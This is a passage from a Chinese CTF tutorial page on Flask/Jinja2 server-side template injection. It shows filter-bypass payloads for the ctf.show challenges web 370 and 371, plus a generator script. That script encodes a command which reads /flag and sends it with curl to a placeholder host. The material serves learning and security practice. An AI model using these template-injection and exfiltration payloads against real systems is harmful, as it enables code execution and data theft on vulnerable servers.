<span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">])</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/e817b319-1a88-47f3-8496-4d4aef9f2720.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/e817b319-1a88-47f3-8496-4d4aef9f2720.png"></a></p>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/6bdfc5e5-95cb-4162-8c71-6513a0bc44b4.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/6bdfc5e5-95cb-4162-8c71-6513a0bc44b4.png"></a></p>
<h3 id="toc_web-370"><a href="https://tttang.com/archive/1698/#toc_web-370">web 370</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/b3d6a8cd-6158-4e3e-8f2d-c1a7f6f73012.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/b3d6a8cd-6158-4e3e-8f2d-c1a7f6f73012.png"></a><br>
这里的话就可以利用上关姿势，然后我们构造出数字来进行替换即可</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">e</span><span class="o">=</span><span class="nb">dict</span> <span class="p">(</span><span class="n">aaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">bbbbbbbbbbbb</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">ee</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">eee</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaeeeeeeaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">eeee</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">eeeee</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">eeeeee</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ini</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">init</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">glo</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">geti</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">getitem</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">built</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">x</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">ini</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">glo</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">geti</span><span class="p">))(</span><span class="n">built</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">x</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">flag</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="n">ee</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="n">eeee</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="n">eeeeee</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="n">eee</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="n">eeeee</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<h3 id="toc_web-371"><a href="https://tttang.com/archive/1698/#toc_web-371">web 371</a></h3>
<p>print被过滤，这里的话我们用反弹shell来做</p>
<div class="highlight"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">c8f74fd3</span><span class="o">-</span><span class="n">a05a</span><span class="o">-</span><span class="mi">477</span><span class="n">c</span><span class="o">-</span><span class="n">bb97</span><span class="o">-</span><span class="mi">10325</span><span class="n">b9ce77d</span><span class="o">.</span><span class="n">chall</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">show</span><span class="err">?</span><span class="n">name</span><span class="o">=</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">c</span><span class="o">=</span><span class="p">(</span><span class="n">t</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">ee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccccccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccccccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">coun</span><span class="o">=</span><span class="p">(</span><span class="n">ccc</span><span class="o">~</span><span class="n">ccccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">po</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">p</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">po</span><span class="p">)(</span><span class="n">coun</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ini</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">init</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">glo</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">geti</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">getitem</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">built</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">x</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">ini</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">glo</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">geti</span><span class="p">))(</span><span class="n">built</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">x</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cmd</span><span class="o">=</span>
<span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="n">abc</span>
<span class="p">{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p>cmd内的内容由以下脚本生成</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">aaa</span><span class="p">(</span><span class="n">t</span><span class="p">):</span>
    <span class="n">t</span><span class="o">=</span><span class="s1">'('</span><span class="o">+</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">t</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">:])</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="s1">'c'</span><span class="o">+</span><span class="s1">'~'</span><span class="o">+</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="s1">'c'</span><span class="o">+</span><span class="s1">')|int'</span>
    <span class="k">return</span> <span class="n">t</span>
<span class="n">s</span><span class="o">=</span><span class="s1">'__import__("os").popen("curl http://xxx:7777?p=`cat /flag`").read()'</span>
<span class="k">def</span> <span class="nf">ccchr</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="n">t</span><span class="o">=</span><span class="s1">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
        <span class="k">if</span> <span class="n">i</span><span class="o">&lt;</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="n">t</span><span class="o">+=</span><span class="s1">'chr('</span><span class="o">+</span><span class="n">aaa</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span><span class="o">+</span><span class="s1">')%2b'</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">t</span><span class="o">+=</span><span class="s1">'chr('</span><span class="o">+</span><span class="n">aaa</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span><span class="o">+</span><span class="s1">')'</span>
    <span class="k">return</span> <span class="n">t</span>
<span class="nb">print</span><span class="p">(</span><span class="n">ccchr</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/0ab3490b-85bf-4040-bdb3-56a53e1ae7d2.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/0ab3490b-85bf-4040-bdb3-56a53e1ae7d2.png"></a></p>
<h1 id="toc__12"><a href="https://tttang.com/archive/1698/#toc__12">参考文献</a></h1>
<p><a href="https://flask.palletsprojects.com/en/2.2.x/" target="_blank">https://flask.palletsprojects.com/en/2.2.x/</a><br>
<a href="https://docs.python.org/zh-cn/3/tutorial/inputoutput.html" target="_blank">https://docs.python.org/zh-cn/3/tutorial/inputoutput.html</a><br>
<a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#filters" target="_blank">https://jinja.palletsprojects.com/en/3.0.x/templates/#filters</a><br>
<a href="https://xz.aliyun.com/t/9407#toc-2" target="_blank">https://xz.aliyun.com/t/9407#toc-2</a><br>
<a href="https://xz.aliyun.com/t/3679#toc-11" target="_blank">https://xz.aliyun.com/t/3679#toc-11</a><br>
<a href="https://blog.csdn.net/qq_38154820/article/details/111399386" target="_blank">https://blog.csdn.net/qq_38154820/article/details/111399386</a><br>
<a href="https://xz.aliyun.com/t/10394#toc-13" target="_blank">https://xz.aliyun.com/t/10394#toc-13</a><br>
<a href="https://y4tacker.blog.csdn.net/article/details/107752717" target="_blank">https://y4tacker.blog.csdn.net/article/details/107752717</a><br>
<a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#builtins" target="_blank">https://misakikata.github.io</a></p></article>
    </div>
  </div>

  <div class="gx-card">
    <div class="gx-card-header d-flex mb-4">
      <div class="mr-auto"><h3 class="card-heading">评论</h3></div>
    </div>

    

    
      <div class="alert alert-warning fade show border" role="alert">
        <h3 class="alert-heading">请先登录</h3>
        <p>你需要先<a href="https://tttang.com/auth/login/">登录</a>后才能发表评论。</p>
      </div>
    

  </div>

    </div>
    <div class="col-md-3 col-sm-12">
      
  


<div class="gx-card text-center mb-4 author-card">
  <div class="gx-card-header-color bg-grey lighten-4">
    <a href="https://tttang.com/user/quan9i" class="no-decoration"><img class="user-avatar size-100 " src="./FLask SSTI从零到入门 - 跳跳糖_files/a341024c-7d16-40a5-883c-bc62ba5ff1e0.jpg"></a>
      <div class="gx-card-hd-content">
          <h4 class="mb-1 mt-2 font-weight-bold"><a href="https://tttang.com/user/quan9i" class="no-decoration color-black">quan9i</a></h4>
          <p class="sub-heading">一个什么也不会的fw</p>
      </div>
  </div>
  <div class="gx-card-body ">
    
    <img src="./FLask SSTI从零到入门 - 跳跳糖_files/twitter.svg" class="size-40 icon-social" alt="twitter" data-toggle="tooltip" data-placement="top" title="" data-original-title="暂无">
    

    
    <img src="./FLask SSTI从零到入门 - 跳跳糖_files/weibo.svg" class="size-40 icon-social" alt="weibo" data-toggle="tooltip" data-placement="top" title="" data-original-title="暂无">
    

    
    <img src="./FLask SSTI从零到入门 - 跳跳糖_files/github.svg" class="size-40 icon-social" alt="github" data-toggle="tooltip" data-placement="top" title="" data-original-title="暂无">
    

      <img src="./FLask SSTI从零到入门 - 跳跳糖_files/wechat.svg" class="size-40 icon-social" alt="wechat" data-toggle="tooltip" data-placement="top" title="" data-original-title="暂无">
  </div>
</div>
  



<div class="gx-card mb-4">
  <div class="gx-card-header d-flex">
      <div class="mr-auto">
          <h3 class="card-heading d-inline-block mb-0">随机分类</h3>
      </div>
  </div>

  <div class="gx-card-body">
    
    
    <div class="media project-list">
        <span class="circle-shape bg-info"></span>
        <div class="media-body">
            <a class="project-name" href="https://tttang.com/sort/hardware/">硬件与物联网</a>
            <span class="meta-date">文章：40 篇</span>
        </div>
    </div>
    
    <div class="media project-list">
        <span class="circle-shape bg-danger"></span>
        <div class="media-body">
            <a class="project-name" href="https://tttang.com/sort/exploit/">Exploit</a>
            <span class="meta-date">文章：40 篇</span>
        </div>
    </div>
    
    <div class="media project-list">
        <span class="circle-shape bg-danger"></span>
        <div class="media-body">
            <a class="project-name" href="https://tttang.com/sort/front/">前端安全</a>
            <span class="meta-date">文章：29 篇</span>
        </div>
    </div>
    
    <div class="media project-list">
        <span class="circle-shape bg-danger"></span>
        <div class="media-body">
            <a class="project-name" href="https://tttang.com/sort/sql_injection/">SQL注入</a>
            <span class="meta-date">文章：39 篇</span>
        </div>
    </div>
    
    <div class="media project-list">
        <span class="circle-shape bg-info"></span>
        <div class="media-body">
            <a class="project-name" href="https://tttang.com/sort/enterprise/">企业安全</a>
            <span class="meta-date">文章：40 篇</span>
        </div>
    </div>
    
  </div>
</div>

  


<div class="gx-card mb-4">
  <div class="gx-card-header d-flex mb-2">
      <div class="m-auto">
          <h3 class="card-heading">扫码关注公众号</h3>
      </div>
  </div>
  <div class="table-responsive border-0">
      <img src="./FLask SSTI从零到入门 - 跳跳糖_files/offical_account_qrcode.jpg" width="100%" alt="WeChat Offical Account QRCode">
  </div>
</div>
  




<div class="gx-card mb-4">
  <div class="gx-card-header d-flex mb-2">
      <div class="mr-auto">
          <h3 class="card-heading">最新评论</h3>
      </div>
  </div>
  <div class="table-responsive border-0">
      <table class="default-table table-sm table remove-table-border mb-0 ">
          <tbody>
          
          
            <tr>
                <td class="pl-0 size-50 vtop">
                  <a class="no-decoration color-black" href="https://tttang.com/archive/1890/#comment-12402"><img class="user-avatar size-50 " src="./FLask SSTI从零到入门 - 跳跳糖_files/d54919aa-7d79-43db-9921-ce8db5900488.jpg"></a>
                </td>
                <td>
                    <h4 class="user-name"><a class="no-decoration color-black" href="https://tttang.com/archive/1890/#comment-12402">合天网安实验室</a></h4>
                  <p class="user-description">学到了</p>
                </td>
            </tr>
          
            <tr>
                <td class="pl-0 size-50 vtop">
                  <a class="no-decoration color-black" href="https://tttang.com/archive/1665/#comment-12401"><div class="bg-warning size-50 user-avatar border-0 ">
                  <h3 class="m-0 text-white">J</h3>
              </div></a>
                </td>
                <td>
                    <h4 class="user-name"><a class="no-decoration color-black" href="https://tttang.com/archive/1665/#comment-12401">janusna</a></h4>
                  <p class="user-description">楼主你好。关于widows端的微信数据库在得道密匙后可以通过数据库软件直接打开查</p>
                </td>
            </tr>
          
            <tr>
                <td class="pl-0 size-50 vtop">
                  <a class="no-decoration color-black" href="https://tttang.com/archive/1890/#comment-12400"><div class="bg-primary size-50 user-avatar border-0 ">
                  <h3 class="m-0 text-white">R</h3>
              </div></a>
                </td>
                <td>
                    <h4 class="user-name"><a class="no-decoration color-black" href="https://tttang.com/archive/1890/#comment-12400">rrrwxvvt</a></h4>
                  <p class="user-description">学到了</p>
                </td>
            </tr>
          
            <tr>
                <td class="pl-0 size-50 vtop">
                  <a class="no-decoration color-black" href="https://tttang.com/archive/1450/#comment-12399"><div class="bg-danger size-50 user-avatar border-0 ">
                  <h3 class="m-0 text-white">M</h3>
              </div></a>
                </td>
                <td>
                    <h4 class="user-name"><a class="no-decoration color-black" href="https://tttang.com/archive/1450/#comment-12399">mifash</a></h4>
                  <p class="user-description">👍</p>
                </td>
            </tr>
          
            <tr>
                <td class="pl-0 size-50 vtop">
                  <a class="no-decoration color-black" href="https://tttang.com/archive/1871/#comment-12398"><div class="bg-primary size-50 user-avatar border-0 ">
                  <h3 class="m-0 text-white">Z</h3>
              </div></a>
                </td>
                <td>
                    <h4 class="user-name"><a class="no-decoration color-black" href="https://tttang.com/archive/1871/#comment-12398">ZZZZZZ</a></h4>
                  <p class="user-description">好像不是，还是这样</p>
                </td>
            </tr>
          
          </tbody>
      </table>
  </div>
</div>

  


<script src="./FLask SSTI从零到入门 - 跳跳糖_files/hm.js.下载"></script><script src="./FLask SSTI从零到入门 - 跳跳糖_files/jquery.min.js.下载"></script>

<div class="gx-card text-center mb-4 author-card " id="catalogue-container">
    <div class="gx-card-header d-flex mb-2">
        <div class="mr-auto">
            <h3 class="card-heading">目录</h3>
        </div>
    </div>
    <div id="catalogue"><h1 id="toc_"><a href="https://tttang.com/archive/1698/#toc_">前言</a></h1><h1 id="toc__1"><a href="https://tttang.com/archive/1698/#toc__1">相关知识</a></h1><h2 id="toc_ssti"><a href="https://tttang.com/archive/1698/#toc_ssti">什么是SSTI</a></h2><h2 id="toc_pycharmflask"><a href="https://tttang.com/archive/1698/#toc_pycharmflask">pycharm搭建flask环境</a></h2><h3 id="toc__2"><a href="https://tttang.com/archive/1698/#toc__2">模板渲染</a></h3><h3 id="toc__3"><a href="https://tttang.com/archive/1698/#toc__3">漏洞成因</a></h3><h2 id="toc_ssti_1"><a href="https://tttang.com/archive/1698/#toc_ssti_1">SSTI前置知识</a></h2><h3 id="toc_class"><a href="https://tttang.com/archive/1698/#toc_class">—class—</a></h3><h3 id="toc_base"><a href="https://tttang.com/archive/1698/#toc_base">—base—</a></h3><h3 id="toc_mro"><a href="https://tttang.com/archive/1698/#toc_mro">—mro—</a></h3><h3 id="toc_subclasses"><a href="https://tttang.com/archive/1698/#toc_subclasses">—subclasses—()</a></h3><h2 id="toc__4"><a href="https://tttang.com/archive/1698/#toc__4">常用过滤器</a></h2><h2 id="toc_ssti_2"><a href="https://tttang.com/archive/1698/#toc_ssti_2">SSTI语句构造</a></h2><h1 id="toc_ssti_3"><a href="https://tttang.com/archive/1698/#toc_ssti_3">SSTI常见绕过方式</a></h1><h2 id="toc__5"><a href="https://tttang.com/archive/1698/#toc__5">绕过.</a></h2><h2 id="toc__"><a href="https://tttang.com/archive/1698/#toc__">绕过_</a></h2><h2 id="toc__6"><a href="https://tttang.com/archive/1698/#toc__6">绕过[]</a></h2><h2 id="toc__7"><a href="https://tttang.com/archive/1698/#toc__7">绕过{{</a></h2><h2 id="toc__8"><a href="https://tttang.com/archive/1698/#toc__8">绕过单引号和双引号</a></h2><h2 id="toc_args"><a 